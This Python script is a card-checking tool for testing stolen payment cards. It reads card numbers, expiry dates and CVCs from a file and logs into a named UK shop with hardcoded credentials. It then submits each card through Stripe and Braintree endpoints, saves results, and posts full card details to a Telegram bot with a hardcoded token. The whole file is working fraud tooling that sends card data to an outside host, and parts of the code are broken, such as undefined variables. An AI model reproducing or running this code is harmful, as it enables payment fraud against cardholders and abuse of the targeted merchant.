import requests,time,user_agent,re,base64,random,re,base64,os,sys
from user_agent import *
from colorama import Fore
#---------[COLORS]--------#
Z =  '\033[91m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
OKBLUE = '\033[94m'
WARNING = '\033[93m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
LIME = '\033[38;5;10m'
W=Fore.WHITE
L=Fore.BLUE
#-------[CLEAR]--------#
def clear():
    os.system('clear')
#----------LOGO-------------#
llogo = ("""
\033[38;2;255;69;0m                       __             __   _ ____
  ___  ____ ___  ____  / /___  _______/ /__(_) / /
 / _ \/ __ `__ \/ __ \/ __/ / / / ___/ //_/ / / / 
/  __/ / / / / / /_/ / /_/ /_/ (__  ) ,< / / / /  
\___/_/ /_/ /_/ .___/\__/\__, /____/_/|_/_/_/_/   
             /_/        /____/             \033[1;93m
\x1b[1;95m┏───────────────────────────────────────────────┓
\x1b[1;94m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘈𝘜𝘛𝘏𝘖𝘙     \x1b[1;97m: \033[38;2;72;209;204memptyskill
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘠𝘗𝘌       \x1b[1;97m: \033[38;2;255;69;0mPAID🔥
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;147;112;219memptyskill
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘖𝘖𝘓       \x1b[1;97m: \033[38;2;0;206;209mPH CHECKER
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘝𝘌𝘙𝘚𝘐𝘖𝘕    \x1b[1;97m: \033[38;2;255;105;180m1.0
\x1b[1;91m \x1b[1;46m\033[1;91m ✅ NOT JUST A BRAINTREE CHECKER\033[;0m\033[1;91m\033[1;92m
\x1b[1;95m┗───────────────────────────────────────────────┛
""")
def linex():
        print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")
def clear():
        os.system(f'clear')
        print(logo)
#--------[FLAGS]-----------#
def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
channel_id = "-1002317552901"
country_flags = {
    "Afghanistan": "🇦🇫", "Albania": "🇦🇱", "Algeria": "🇩🇿", "Andorra": "🇦🇩", "Angola": "🇦🇴", "Antigua and Barbuda": "🇦🇬", "Argentina": "🇦🇷", "Armenia": "🇦🇲", "Australia": "🇦🇺", "Austria": "🇦🇹", "Azerbaijan": "🇦🇿",
    "Bahamas": "🇧🇸", "Bahrain": "🇧🇭", "Bangladesh": "🇧🇩", "Barbados": "🇧🇧", "Belarus": "🇧🇾", "Belgium": "🇧🇪", "Belize": "🇧🇿", "Benin": "🇧🇯", "Bhutan": "🇧🇹", "Bolivia": "🇧🇴", "Bosnia and Herzegovina": "🇧🇦", "Botswana": "🇧🇼",
    "Brazil": "🇧🇷", "Brunei": "🇧🇳", "Bulgaria": "🇧🇬", "Burkina Faso": "🇧🇫", "Burundi": "🇧🇮", "Cabo Verde": "🇨🇻", "Cambodia": "🇰🇭", "Cameroon": "🇨🇲", "Canada": "🇨🇦", "Central African Republic": "🇨🇫", "Chad": "🇹🇩",
    "Chile": "🇨🇱", "China": "🇨🇳", "Colombia": "🇨🇴", "Comoros": "🇰🇲", "Congo": "🇨🇬", "Congo (Democratic Republic)": "🇨🇩", "Costa Rica": "🇨🇷", "Croatia": "🇭🇷", "Cuba": "🇨🇺", "Cyprus": "🇨🇾", "Czech Republic": "🇨🇿",
    "Denmark": "🇩🇰", "Djibouti": "🇩🇯", "Dominica": "🇩🇲", "Dominican Republic": "🇩🇴", "Ecuador": "🇪🇨", "Egypt": "🇪🇬", "El Salvador": "🇸🇻", "Equatorial Guinea": "🇲🇱", "Eritrea": "🇪🇷", "Estonia": "🇪🇪", "Eswatini": "🇸🇿",
    "Ethiopia": "🇪🇹", "Fiji": "🇫🇯", "Finland": "🇫🇮", "France": "🇫🇷", "Gabon": "🇬🇦", "Gambia": "🇲🇲", "Georgia": "🇬🇪", "Germany": "🇩🇪", "Ghana": "🇬🇭", "Greece": "🇬🇷", "Grenada": "🇬🇩", "Guatemala": "🇵🇪",
    "Guinea": "🇬🇳", "Guinea-Bissau": "🇬🇼", "Guyana": "🇬🇾", "Haiti": "🇭🇹", "Honduras": "🇭🇳", "Hungary": "🇭🇺", "Iceland": "🇮🇸", "India": "🇮🇳", "Indonesia": "🇮🇩", "Iran": "🇮🇷", "Iraq": "🇮🇶", "Ireland": "🇮🇪",
    "Israel": "🇮🇱", "Italy": "🇮🇹", "Jamaica": "🇯🇲", "Japan": "🇯🇵", "Jordan": "🇯🇴", "Kazakhstan": "🇰🇿", "Kenya": "🇰🇪", "Kiribati": "🇰🇮", "Korea (North)": "🇰🇵", "Korea (South)": "🇰🇷", "Kuwait": "🇰🇼", "Kyrgyzstan": "🇰🇬",
    "Laos": "🇱🇦", "Latvia": "🇱🇻", "Lebanon": "🇱🇧", "Lesotho": "🇱🇸", "Liberia": "🇱🇸", "Libya": "🇱🇾", "Liechtenstein": "🇱🇮", "Lithuania": "🇱🇹", "Luxembourg": "🇱🇺", "Madagascar": "🇲🇬", "Malawi": "🇲🇼", "Malaysia": "🇲🇾",
    "Maldives": "🇲🇻", "Mali": "🇲🇱", "Malta": "🇲🇹", "Marshall Islands": "🇲🇭", "Mauritania": "🇲🇷", "Mauritius": "🇲🇺", "Mexico": "🇲🇽", "Micronesia": "🇫🇲", "Moldova": "🇲🇩", "Monaco": "🇲🇨", "Mongolia": "🇲🇳", "Montenegro": "🇲🇪",
    "Morocco": "🇲🇦", "Mozambique": "🇲🇿", "Myanmar": "🇲🇲", "Namibia": "🇳🇦", "Nauru": "🇳🇷", "Nepal": "🇳🇵", "Netherlands": "🇳🇱", "New Zealand": "🇳🇿", "Nicaragua": "🇳🇮", "Niger": "🇳🇪", "Nigeria": "🇳🇬", "North Macedonia": "🇲🇰",
    "Norway": "🇳🇴", "Oman": "🇴🇲", "Pakistan": "🇵🇰", "Palau": "🇵🇼", "Palestine": "🇵🇸", "Panama": "🇵🇦", "Papua New Guinea": "🇵🇬", "Paraguay": "🇵🇾", "Peru": "🇵🇪", "Philippines": "🇵🇭", "Poland": "🇵🇱", "Portugal": "🇵🇹",
    "Qatar": "🇶🇦", "Romania": "🇷🇴", "Russia": "🇷🇺", "Rwanda": "🇷🇼", "Saint Kitts and Nevis": "🇰🇳", "Saint Lucia": "🇱🇨", "Saint Vincent and the Grenadines": "🇻🇨", "Samoa": "🇼🇸", "San Marino": "🇸🇲", "Sao Tome and Principe": "🇸🇹",
    "Saudi Arabia": "🇸🇦", "Senegal": "🇸🇳", "Serbia": "🇷🇸", "Seychelles": "🇸🇨", "Sierra Leone": "🇸🇱", "Singapore": "🇸🇬", "Slovakia": "🇸🇰", "Slovenia": "🇸🇮", "Solomon Islands": "🇸🇧", "Somalia": "🇲🇲", "South Africa": "🇿🇦",
    "South Sudan": "🇸🇸", "Spain": "🇪🇸", "Sri Lanka": "🇱🇰", "Sudan": "🇸🇩", "Suriname": "🇸🇷", "Sweden": "🇸🇪", "Switzerland": "🇨🇭", "Syria": "🇸🇾", "Taiwan": "🇹🇼", "Tajikistan": "🇹🇯", "Tanzania": "🇹🇿", "Thailand": "🇹🇭",
    "Timor-Leste": "🇹🇱", "Togo": "🇹🇬", "Tonga": "🇹🇴", "Trinidad and Tobago": "🇹🇹", "Tunisia": "🇹🇳", "Turkey": "🇹🇷", "Turkmenistan": "🇹🇲", "Tuvalu": "🇹🇻", "Uganda": "🇺🇬", "Ukraine": "🇺🇦", "United Arab Emirates": "🇦🇪",
    "United Kingdom": "🇬🇧", "United States of America": "🇺🇸", "Uruguay": "🇺🇾", "Uzbekistan": "🇺🇿", "Vanuatu": "🇻🇺", "Vatican City": "🇻🇦", "Venezuela": "🇻🇪", "Vietnam": "🇻🇳", "Yemen": "🇾🇪", "Zambia": "🇿🇲", "Zimbabwe": "🇿🇼"
}
#--------[BIN-CHECK]-------#
def get_country_flag(country_name):
    return country_flags.get(country_name, '')

def bin_lookup(bin_code):
    url = f"https://bins.antipublic.cc/bins/{bin_code}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        
        bank_name = data.get('bank', 'N/A')
        country_name = data.get('country_name', 'N/A')
        country_flag = data.get('country_flag', '')
        scheme = data.get('brand', 'N/A')
        card_type = data.get('type', 'N/A')
        level = data.get('level', 'N/A')
        country_currencies = data.get('country_currencies', 'N/A')

        scheme = scheme if scheme else "N/A"
        card_type = card_type if card_type else "N/A"
        level = level if level else "N/A"
        bank_name = bank_name if bank_name else "N/A"
        country_name = country_name if country_name else "N/A"
        
        result = (
            f"*🔹 𝗜𝗡𝗙𝗢:* `{scheme.upper()} - {card_type.upper()} - {level.upper()}`\n"
            f"*🔹 𝗜𝗦𝗦𝗨𝗘𝗥:* _{bank_name.upper()}_\n"
            f"*🔹 𝗖𝗢𝗨𝗡𝗧𝗥𝗬:* `{country_name.upper()}` {country_flag}\n"
            f"*🔹 𝗖𝗨𝗥𝗥𝗘𝗡𝗖𝗜𝗘𝗦:* `{country_currencies}`"
        )
        return result
    else:
        return "*[✘] BIN lookup failed.*"
#-------[SAVE CARDS]----#
def save_valid_card(ccx):
    with open("valid_cards.txt", "a") as file:
        file.write(f"{ccx}\n")
#-------[USERNAME FETCH]
bot_token = "7844307981:AAFqCTbxeNJ6CBglaRc2SazU3CmcBbr9DIw"
def get_telegram_username(user_id, bot_token):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={user_id}"
        response = requests.get(url)
        data = response.json()
        
        if response.status_code == 200 and "result" in data:
            username = data["result"].get("username", None)
            if username:
                return f"@{username}"
            else:
                return "This user does not have a username."
        else:
            return f"Failed to fetch username. Error: {data.get('description', 'Unknown error')}"
    except Exception as e:
        return f"An error occurred: {str(e)}"
#-------[ANIMATION]-----#
def typewriter(text, speed=0.1):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()
message = f"{LIME}{BOLD}GO TO {WARNING}{UNDERLINE}B3 DROPPER BOT{ENDC} {LIME}AND CLICK ON START. ELSE WAIT,{ENDC} {WARNING}{BOLD}CODE WILL REDIRECT YOU 🤝{ENDC}"

#-------[CHECKER]-------#
clear_terminal()
print(logo)
typewriter(message, speed=0.08)
time.sleep(10)
os.system(f'xdg-open https://t.me/emptyskillbot')
clear_terminal()
print(logo)
user_id = input("Please enter your Telegram user ID: ")
combo=input(X+'CC FILE PATH :'+X)
y=open(f'{combo}',"+r")
start_num = 0
F = '\033[2;32m'
Z= '\033[2;31m'
for y in y:
    start_num += 1
    ccx = y.strip().split('\n')[0]
    c = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    bin_code = c[:6]
    if "20" in yy:
        yy = yy.split("20")[1]
    acc = ['view99812@gmail.com']
    email = random.choice(acc)
    print(F) 
    user = user_agent.generate_user_agent()
    r = requests.session()
    headers = {'user-agent': user}
    response = r.post(
        'https://www.dalewooddesignsgb.co.uk/my-account/add-payment-method/', headers=headers)
    nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
    data = {
    'username': email,
    'password': 'Raia@240213',
    'wpa_initiator': '',
    'alt_s': '',
    'udwsno9687': '828176',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
    'ct_bot_detector_event_token': 'bad77f24b9ad40433de7effd7f8a8ea7a9c0cdd28635f17c1337ffd7f1828aa4',
}
    
    response = r.post(
        'https://www.dalewooddesignsgb.co.uk/my-account/add-payment-method/',
        cookies=r.cookies,
        headers=headers,
        data=data,
    )
    nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
    enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
    dec = base64.b64decode(enc).decode('utf-8')
    au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
    nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
    headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
}

    data = f'type=card&billing_details[name]=+&billing_details[email]=view99812%40gmail.com&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=04b83a55-5559-448f-8b8b-e48163f57fc62e7bb7&muid=26d24a50-8c44-4835-bebb-23a80e637e81dc92c6&sid=6a3cffdb-645c-4f5b-b134-aaa8ffad838c68d369&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+split-card-element&referrer=https%3A%2F%2Fwww.dalewooddesignsgb.co.uk&time_on_page=343635&key=pk_live_8AOKNZetuMq5MDbq6uKUyjDM&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiL2IzK1U5OEhOWWgwbTNmUFZpK0tNbThsOXl0SkdGL2w0MzFTNHpMU0ZoaUV5ZkFmWmhxUGowdmtQV3pXR2oxMXliL2l0SXBJaEVzNm5vTkdYZGljQ0QrWDRROWFWV3FzblFOODNlN3AyVTJuK2x1K2Y1Y1dWN0g2QWRWQTFoRHZGN0RpTWxqV2FIU3M2bnQ4SGNtek1pNEhVSWNzVDNveSs0bVo1b0xTZ1dHMEwzV1hSODJwRkkyckphbDBmeUpuSUQrZVV6UnIyeGpzZjhLZFBxNGNrdXgwUTh0b0d6OUo4QmNHZk02RmhTNEtMZmFZV1orUHMrOXNZbjBWL2hkR1JZOTBPQ3ZoM1NqZ0tIcDBtUXc4YWVFcHVkQXhQYWppN0R0dlVqajV0NE5wSWxWUFRUekpXeXQzNVhvSjVrZDZFSHFnSHcvSGNlb3kxeWNqNkR6aDlpNjFFallZSTJWWFNjNVZUc1BKQ05RbE05a1F6Uk1DaTV0Nk56cjQ0NDFXUlVYdkFNbFptbjdHL1pnZkZmRDk0eTdNWUp1YXBPS1I4NWhFekZUeTBZQXZDb2xSWWx5dDFwcy9aN21aSWwyRHNOSGN2cGtzQ1VNbVhKVTcxbzc2WkRYeHpta2tGNWp3b0Q4a2Y1cGNJQnFZemtTcUdVQlZHeTN0Q2tHbGJ5ei8xQVJ5ZFNxTStRbnh0STNyY243R0N4TW9EVVc2VDVKaTRPa1I4UXNNZXVXbU1xSllNRVhJS255QTdTUEdwZEgzbzJYWE5wVC9WL2RKREh1d0hwUnlIdEFnOUdsbmFqaDJsdkJERHhyYkFpVHJINFRsWWNSaDFDdjArTTZ6MnlTZWl5RVVMYmVXakJRcFVVenpvSitPUk96SDc1eWtPUkw4aXYvVGxXQWJwT214M3Q2ZklFYlllTFh2Z2JYS0tYdlFKUEQrSzUwYnZvMS9XY3plZ0Y5dHEzOURRb1NNWmJpQ3lpZHE4RFJOYWpxN1dLeWFEdnpIcStqNCtjUHp0dFZWK2M2OENmeVgvQWc2dUdESzB1T2lsdmZPM3pKSS9kYndxV3VRSjhmdjROR0NVOVo1NDdJNGxjUzlEZERoYkxhaHdIdVU1RUVMaW1CUkx4RDlPaW5CL3dITVBNSVl2VDFoTktTRmp3aUFVeUl4by9tU3Z1cVExVzgrOVc2UGlGaDFIUTNERlYrYnNKQ0hvWitadDh1ZHFOTEdzblZPY2RFLzFDa2pFTnNGQ0YxZ1EvL3VQRFcxWkdCTFhGMzFzbW51Ykc2NlFuaUdzR0ZYbHhhcDJyRzVGZ3FJeVBteTdiS1RtVlRhcWRNTXJyNkJBdHFPR3QvSFM3ZENmQUZ0Y251eUVkM2k2YUZXcHQrK2hJcUF3TjFka2ZuSlcyYThGSmZKNCs4dURsQ3dhNkJuUU5SbFZTMW1jNDVhN1ZPV1krTkk0aVlYb0s5dWlLY0tzRzJNK3dvY3ZUaHpDckM4OE9kKzRnM1NvOHVUbWRhNHQ0eHJDM1NvUkFxUG9tR2hIWjRhZTZOT0kwY0JCV25MNmdWTEF6Z0tWRDFjaXlXSW1hYm90am9uaTV0YkhPZ0hmMXBBd2xXbFEyTGczVGx3TFZSL3UyYlBNWkNVMTJ2WjM5SjJ4TWE5bi9DRklBTHZwRHlQZlZQWU12STJER2dJSXVpY1FMeWlMdStNWnJDd2xRNnV3Kzlybis4bWNQQTZld2psR05SSFE0Qlk3RTVUQzFXcU1pVGlLVTF4L1BmRGU5N0FBVE5UeW5JMnpTK2plWGNPRWhFelFDUDliYk90QTdodVZPc3RzTWVJMlM1YUhiMDd2UjFoeGFqZ3kxa3pneVlacXpzeTRwQXRiOUhKaXZjYWszdHc1RXlsZUFxdzB1N1BMT2lxOEFvSUNDQlVEdnltaXdxeUswa1M2d2FSRzJoZzRQcWlyMUtadVR0WE5uMUpMcHV0VERGeExZU1Y0VmFyRXVVR0NwMXdzL1d2d3I4aHV1M2tXR1hlRUxTUEx1TFpDR2lKQVMyM0Y4Mit6SnRvcXQwZllwemx4enhnTy9uczhOS2tIOWhySWh2NTg3V1dEd0V0amplM0lVL05BQnNrVURDUEFHdUJjWThUbGp2ai9qYlVnc1M5VDVIc0tQYnlyNlpQbE1ibXEvblIwdzA0N2oyWlV3VE10Y3NyZVhudG53NlBlVWF0UWpEcE9XWW4wT05WRUNBSEo4eEg5bjNMV0czQjNpQU1xK2NTc0NXMysyTzJYbytuZGwvNkxDay9lL2twTStHNGhRQ0xYaHVib1AzWjk3aHAvY0tZQy8rNUs5eEozeGUwcDhRdWRJSjMyOFVXWnl0ZG1laFRlSkFORDVURTJ0VktHcDdzV0k2dzZNSTFPeU03N0d2V1ZpUWJoUWlsSDZwNEdvQU5RN2EwazRyM0tJR3V3d3k3RjJiUDRPR1dsMmZrRDNpVGR1R1hCa2E2OXdIVGZudy9CTnQ2UDlSRlJNUmZFQVlQcXNld3FSWUJGa2xod0dXZldvSjhMN0hvQy9MTU0rcGFNaHlFa29uM0g0anJlTzZVdkQ4UzVjbkZwNjZEOFVvTzBzWUlCUE04ZWFsUHE4ejFjb2IwUkt0K1g2eUxwOHJBM3crMXFoZVROSDdpTlJUaVVwVW9iWnkvMjBCSi9Zd05hN2FJSXJYUHFpNzFDQ00vTDNuSUhZS25VNDJlbXBOMnU4ZGN5WkRwVU1vRjVRVStXRFFGaUl6VUVZYnpsQlZIMi9ueWtLVUdNTnRrc1ZNTzl6ME4wcGxTbU0wVkJ3QkpsWE9GNnVQYU50M3FIWkVaMUMxWHh4WnlLMGQwVDQvL2hnajJ3WHBwWDFNWU1FR1Nra2RxVEJXd3RqND0iLCJleHAiOjE3MzUxNDY0MjEsInNoYXJkX2lkIjoyNTkxODkzNTksImtyIjoiOTFmN2Q3NCIsInBkIjowLCJjZGF0YSI6Ilowd2VtR0ZMMHVTSnNXaGFjSklua2VTMkE0YkxtaTRGZ2oyVzMwTTcvOTBnTEZxNDNDQVhKVWJEY09NSWwyTWZMUGtuNGxKUjZUbjgrTkJCcDliQXNUSWhKcXY5bWNoN3NlbUNpRjNVallBZWZMcHRrYVZWNmNFZWU3NUh1VUhjZFFNcU5FWlltc2pBV3gzQXhPQXNSU1cwODdKNERTdmRrMjcwOHFUNCtiZ21qcDFSelFRRjcydCtHVzlUdkxudXVSdEdEQmZWVGZEQjBod3kifQ.ggTEN5QQpwoHuR0XyEdthag28huz-f1yQMK7Nq1CTJw'
    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    tok = response.json()['id']
    import requests
    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.dalewooddesignsgb.co.uk',
    'priority': 'u=1, i',
    'referer': 'https://www.dalewooddesignsgb.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'wc-ajax': 'wc_stripe_create_setup_intent',
}

    data = {
    'stripe_source_id': id,
    'nonce': '6e41d8823c',
}

    response = r.post('https://www.dalewooddesignsgb.co.uk/', params=params, headers=headers, data=data)
    text = response.text
    pattern = r'"status":\s*"(.*?)"'
    match = re.search(pattern, text)
    if match:
        status = match.group(1)
    if status == "error":
        print(f"\033[1;31m[\033[1;33m{start_num}\033[1;31m] \033[1;37m{ccx} \033[0;31m>> \033[1;31mDecline ❌\033[0m")
    elif status == "success":
        print(f"\033[1;32m[\033[1;33m{start_num}\033[1;32m] \033[1;37m{ccx} \033[0;32m>> \033[1;32mSuccess ✅\033[0m")
    else:
        print(f"\033[1;31m[\033[1;33m{start_num}\033[1;31m] \033[1;37m{ccx} \033[0;31m>> \033[1;31mDecline ❌\033[0m")
        save_valid_card(ccx)
        username = get_telegram_username(user_id, bot_token)
        bin_result = bin_lookup(bin_code)
        message = f"""
✥ PH Stripe 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐕1.0 ✥
★━━━━━━✧★✰★✧━━━━━━★
🔹 𝗖𝗮𝗿𝗱- {ccx}
🔹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆- Stripe [$0.01]
🔹 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲- ⤿ {status} ⤾
★━━━━━━[𝐁𝐈𝐍 𝐈𝐍𝐅𝐎]━━━━━━★
{bin_result}
★━━━━━━✧★✰★✧━━━━━━★
✨ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲- [★ emptyskill 🐾🐐](tg://user?id=6041675516)
✨ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲- {username}
"""
        requests.post(f"https://api.telegram.org/bot7844307981:AAFqCTbxeNJ6CBglaRc2SazU3CmcBbr9DIw/sendMessage", data={'chat_id': user_id, 'text': message, 'parse_mode': 'Markdown'})
else:
    print(f'[{start_num}] {ccx} >> {status}❌')
    time.sleep(100)
    